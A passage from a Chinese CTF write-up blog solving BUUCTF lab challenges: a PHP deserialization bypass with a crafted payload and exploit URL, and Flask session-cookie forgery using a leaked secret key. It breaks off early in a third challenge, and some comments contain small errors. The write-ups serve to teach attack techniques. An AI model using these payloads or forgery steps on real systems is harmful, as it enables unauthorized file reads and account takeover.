青龙组]AreUSerialz1</h2><p>1)题目描述</p>\n<p>无</p>\n<p>2)wp</p>\n<p>一道典型的序列化题目</p>\n<p>先对代码进行分析</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">&quot;flag.php&quot;</span>);<br><br><span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileHandler</span> </span>&#123;<br><br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$op</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$filename</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$content</span>;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$op</span> = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-string\">&quot;Hello World!&quot;</span>;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">process</span>();<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">process</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;1&quot;</span>) &#123;<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">write</span>();<br>        &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;2&quot;</span>) &#123;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">read</span>();<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-variable\">$res</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">write</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;filename) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;content)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">strlen</span>((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable language_\">$this</span>-&gt;content) &gt; <span class=\"hljs-number\">100</span>) &#123;<br>                <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Too long!&quot;</span>);<br>                <span class=\"hljs-keyword\">die</span>();<br>            &#125;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-title function_ invoke__\">file_put_contents</span>(<span class=\"hljs-variable\">$this</span>-&gt;filename, <span class=\"hljs-variable\">$this</span>-&gt;content);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$res</span>) <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Successful!&quot;</span>);<br>            <span class=\"hljs-keyword\">else</span> <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">read</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;filename)) &#123;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$this</span>-&gt;filename);<br>        &#125;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$res</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">output</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$s</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op === <span class=\"hljs-string\">&quot;2&quot;</span>)<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;op = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;content = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">is_valid</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; <span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$s</span>); <span class=\"hljs-variable\">$i</span>++)<br>        <span class=\"hljs-keyword\">if</span>(!(<span class=\"hljs-title function_ invoke__\">ord</span>(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &gt;= <span class=\"hljs-number\">32</span> &amp;&amp; <span class=\"hljs-title function_ invoke__\">ord</span>(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &lt;= <span class=\"hljs-number\">125</span>))<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>&#123;<span class=\"hljs-string\">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class=\"hljs-variable\">$str</span> = (<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;str&#x27;</span>];<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">is_valid</span>(<span class=\"hljs-variable\">$str</span>)) &#123;<br>        <span class=\"hljs-variable\">$obj</span> = <span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-variable\">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>    <span class=\"hljs-variable\">$op</span> = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>    <span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&quot;/tmp/tmpfile&quot;</span>;<br>    <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-string\">&quot;Hello World!&quot;</span>;<br>    <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">process</span>();<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>__construct()函数没有用，不参与序列化中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">is_valid</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; <span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$s</span>); <span class=\"hljs-variable\">$i</span>++)<br>        <span class=\"hljs-keyword\">if</span>(!(<span class=\"hljs-title function_ invoke__\">ord</span>(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &gt;= <span class=\"hljs-number\">32</span> &amp;&amp; <span class=\"hljs-title function_ invoke__\">ord</span>(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &lt;= <span class=\"hljs-number\">125</span>))<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;<br>&#125;<br><span class=\"hljs-comment\">//ord() 函数返回字符串中第一个字符的 ASCII 值。</span><br><span class=\"hljs-comment\">// ASCII值32为2，ASCII值125为%</span><br></code></pre></td></tr></table></figure>\n\n<p>这个函数主要是过滤掉protect类的成员,在序列化的时候是以%00作为标识符</p>\n<figure class=\"highlight lasso\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs lasso\">*但是在PHP版本大于<span class=\"hljs-number\">7.1</span>的情况下，<span class=\"hljs-keyword\">protect</span>类和<span class=\"hljs-keyword\">public</span>类没什么好注意的，所以在构造序列化时改为<span class=\"hljs-keyword\">public</span>可以绕过is_valid函数<br></code></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op === <span class=\"hljs-string\">&quot;2&quot;</span>)<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;op = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>    <span class=\"hljs-variable language_\">$this</span>-&gt;content = <span class=\"hljs-string\">&quot;&quot;</span>;<br>    <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">process</span>();<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>__destruc()函数主要是不让<code>op===&quot;2&quot;</code>，但是在process函数里op又要为“2”</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">process</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;1&quot;</span>) &#123;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">write</span>();<br>    &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;2&quot;</span>) &#123;<br>        <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">read</span>();<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-variable\">$res</span>);<br>    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Bad Hacker!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n<p>所以这里利用强弱类型比较，__destruc()函数里op是不能为2，但是是强类型比较，是字符2【”2”】,所以op&#x3D;2【数字2】，就绕过达到读取flag.php的结果</p>\n<p>于是构造出php序列化</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileHandler</span> </span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$op</span>=<span class=\"hljs-number\">2</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$filename</span>=<span class=\"hljs-string\">&quot;flag.php&quot;</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$content</span>;<br>&#125;<br><br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">FileHandler</span>();<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">serialize</span>(<span class=\"hljs-variable\">$a</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>得到序列化结果</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">O</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-string\">&quot;FileHandler&quot;</span>:<span class=\"hljs-number\">3</span>：&#123;s:<span class=\"hljs-number\">2</span>:<span class=\"hljs-string\">&quot;op&quot;</span>;i:<span class=\"hljs-number\">2</span>;s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">&quot;filename&quot;</span>;s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">&quot;flag.php&quot;</span>;s:<span class=\"hljs-number\">7</span>:<span class=\"hljs-string\">&quot;content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure>\n\n<p>访问，F12查看【或者改一下filename的值为php:&#x2F;&#x2F;filter伪协议，用base64，可以直接看到】</p>\n<p><code>http://f20b2545-8ff3-4a33-887f-27f4901db96a.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>\n<p>得到flag</p>\n<p><img src=\"/post/wp-buuctf/image-20220822135717175.png\" alt=\"image-20220822135717175\"></p>\n<h2 id=\"7-HCTF-2018-admin\"><a href=\"#7-HCTF-2018-admin\" class=\"headerlink\" title=\"7.[HCTF 2018]admin\"></a>7.[HCTF 2018]admin</h2><h3 id=\"1-题目描述-4\"><a href=\"#1-题目描述-4\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-4\"><a href=\"#2-wp-4\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>这道题开始当作弱密码题解，结果直接爆破出来了</p>\n<p>用户名：admin</p>\n<p>密码：123</p>\n<p>这样应该最简单的方法了</p>\n<p>但我看了看其他大佬wp，他们把这个当作flask_session伪造的题目</p>\n<p>学习一下</p>\n<p>先注册一个试试</p>\n<p>用户名：admin123</p>\n<p>密码：123456</p>\n<p><img src=\"/post/wp-buuctf/image-20220822203857056.png\" alt=\"image-20220822203857056\"></p>\n<p>只在<code>change password</code>的源码看到线索，知道是flask框架</p>\n<p><img src=\"/post/wp-buuctf/image-20220822203848108.png\" alt=\"image-20220822203848108\"></p>\n<p>访问下载文件</p>\n<p>flask存在一个session伪造漏洞</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">flask的<span class=\"hljs-keyword\">session</span>保存在客户端，一般只是加了签名来防止被截取修改，但是如果没有加密我们就可以对<span class=\"hljs-keyword\">session</span>进行解码来获取其中的用户数据。 <br><br>如果我们在获取到签名的秘钥，就可以按照解码出来的数据进行伪造，重新生成签名的<span class=\"hljs-keyword\">session</span>来达到欺骗服务端。  <br><br>flask的<span class=\"hljs-keyword\">session</span>使用base64对bytes类型的用户数据进行编码，而且编码之前可能进行了压缩(<span class=\"hljs-keyword\">session</span>以 &quot;.&quot;  开头时表示进行了压缩) flask 保存在cookie里面的<span class=\"hljs-keyword\">session</span>一般格式为 data.timestamp.signature<br></code></pre></td></tr></table></figure>\n\n<p>这里的session没有加密，在config.py中得到了签名秘钥<code>ckj123</code>，于是我们就可以重新生成session，来欺骗服务器</p>\n<p><img src=\"/post/wp-buuctf/image-20220822204409898.png\" alt=\"image-20220822204409898\"></p>\n<p>利用cookie editor查看session值</p>\n<p><img src=\"/post/wp-buuctf/image-20220822231718091.png\" alt=\"image-20220822231718091\"></p>\n<p>然后再找发现index.html下有flag提示</p>\n<p><img src=\"/post/wp-buuctf/image-20220823000533344.png\" alt=\"image-20220823000533344\"></p>\n<p>简单分析一下，就是让session里的name&#x3D;&#x3D;”admin”</p>\n<p>所以这里就需要修改一下我们得到的session</p>\n<p>这里建议了解一下一个工具<code>flask-session-cookie-manager-master</code>能对其进行加密解码【可能需要pip下一些模块，百度可以解决】</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">解密<br><span class=\"hljs-keyword\">python</span> flask_session_cookie_manager3.<span class=\"hljs-keyword\">py</span> decode -s “cxk123” -<span class=\"hljs-keyword\">c</span> “你在<span class=\"hljs-keyword\">change</span>页面的session值”<br>加密<br><span class=\"hljs-keyword\">python</span> flask_session_cookie_manager3.<span class=\"hljs-keyword\">py</span> encode -s “cxk123” -t “按照得到解密结果格式改的结果”<br><br><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220822235758750.png\" alt=\"image-20220822235758750\"></p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class=\"hljs-number\">8703</span>c5b8b2d40b<span class=\"hljs-number\">535487</span>2c13dd<span class=\"hljs-number\">4314</span>cccf<span class=\"hljs-number\">9116</span>d2dcd<span class=\"hljs-number\">6598</span>7e5f08b2d6cffdf72cb<span class=\"hljs-number\">7660</span>baeb7d5e76f3ac<span class=\"hljs-number\">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class=\"hljs-number\">3523</span>4b<span class=\"hljs-number\">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;<br><br>把我们的用户名改为admin<br><br>&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class=\"hljs-number\">8703</span>c5b8b2d40b<span class=\"hljs-number\">535487</span>2c13dd<span class=\"hljs-number\">4314</span>cccf<span class=\"hljs-number\">9116</span>d2dcd<span class=\"hljs-number\">6598</span>7e5f08b2d6cffdf72cb<span class=\"hljs-number\">7660</span>baeb7d5e76f3ac<span class=\"hljs-number\">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class=\"hljs-number\">3523</span>4b<span class=\"hljs-number\">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure>\n\n<p>然后再加密</p>\n<p><img src=\"/post/wp-buuctf/image-20220823000020825.png\" alt=\"image-20220823000020825\"></p>\n<p>然后cookie editor修改为我们加密结果</p>\n<figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gcode\">.eJxFUMtu<span class=\"hljs-name\">g0</span>AM_JXK<span class=\"hljs-number\">5</span>xx<span class=\"hljs-number\">4</span>tBekHCKRIiqtEWgJ<span class=\"hljs-number\">8</span>l<span class=\"hljs-number\">4</span>iGkjAy<span class=\"hljs-number\">1</span>IJWlE<span class=\"hljs-number\">2</span>yr<span class=\"hljs-number\">93</span><span class=\"hljs-name\">m1</span>bKwQd<span class=\"hljs-number\">7</span>xvbMXOF<span class=\"hljs-number\">4</span><span class=\"hljs-symbol\">ntq5</span>g-hcD<span class=\"hljs-number\">3</span><span class=\"hljs-meta\">O7</span>gWPfQHSFp<span class=\"hljs-number\">3</span>eIgPhiSTYsuDM<span class=\"hljs-meta\">o956</span>KRaiq<span class=\"hljs-number\">3</span>KJEQ<span class=\"hljs-number\">9</span>xpFR<span class=\"hljs-number\">-6</span>LFEDmfwZ<span class=\"hljs-number\">7</span>c<span class=\"hljs-number\">6</span>SPfRZkq<span class=\"hljs-number\">4</span>qzhfi<span class=\"hljs-number\">0</span>vF<span class=\"hljs-number\">-528</span>sJDpuboUsmAI<span class=\"hljs-number\">0</span>mdx_<span class=\"hljs-meta\">o8</span>lXlaBGLl-yuBmwouVvV<span class=\"hljs-number\">7</span>EySis-rRSkITItZF<span class=\"hljs-number\">4</span>H<span class=\"hljs-number\">4</span>kZjVYbus<span class=\"hljs-number\">6</span>VKrBiTT<span class=\"hljs-number\">1</span>L<span class=\"hljs-number\">7</span>rl<span class=\"hljs-number\">9</span>EQFu<span class=\"hljs-number\">4</span>beA<span class=\"hljs-number\">0</span>T-fj<span class=\"hljs-number\">54</span>dux<span class=\"hljs-number\">4</span>cFq<span class=\"hljs-number\">0</span>OsUifFVZKGwkkTcuBMFp<span class=\"hljs-number\">2</span>T<span class=\"hljs-number\">0</span>otEOWvFgPbkOTkdVWWQ<span class=\"hljs-number\">7</span>bb<span class=\"hljs-number\">3</span>c<span class=\"hljs-number\">72</span>pL<span class=\"hljs-number\">-3</span>jUuhC-Ef<span class=\"hljs-name\">G2</span>jgA<span class=\"hljs-number\">6</span>sb<span class=\"hljs-number\">0</span>I<span class=\"hljs-number\">2</span>zga<span class=\"hljs-number\">26</span><span class=\"hljs-symbol\">ne27</span><span class=\"hljs-keyword\">ge</span><span class=\"hljs-number\">3</span>D<span class=\"hljs-number\">7</span>AeD<span class=\"hljs-number\">4</span>b<span class=\"hljs-number\">34.</span>YwOoDA.quyfjg-Miz<span class=\"hljs-number\">9</span>Y<span class=\"hljs-number\">5</span>cx<span class=\"hljs-number\">6</span>i<span class=\"hljs-number\">5</span>hTVr<span class=\"hljs-number\">0</span>EWjE<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220823000303547.png\" alt=\"image-20220823000303547\"></p>\n<p>得到flag</p>\n<h2 id=\"8-ZJCTF-2019-NiZhuanSiWei\"><a href=\"#8-ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"8.[ZJCTF 2019]NiZhuanSiWei\"></a>8.[ZJCTF 2019]NiZhuanSiWei</h2><h3 id=\"1-题目描述-5\"><a href=\"#1-题目描述-5\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-5\"><a href=\"#2-wp-5\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>先分析一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span>  <br><span class=\"hljs-variable\">$text</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;text&quot;</span>];<br><span 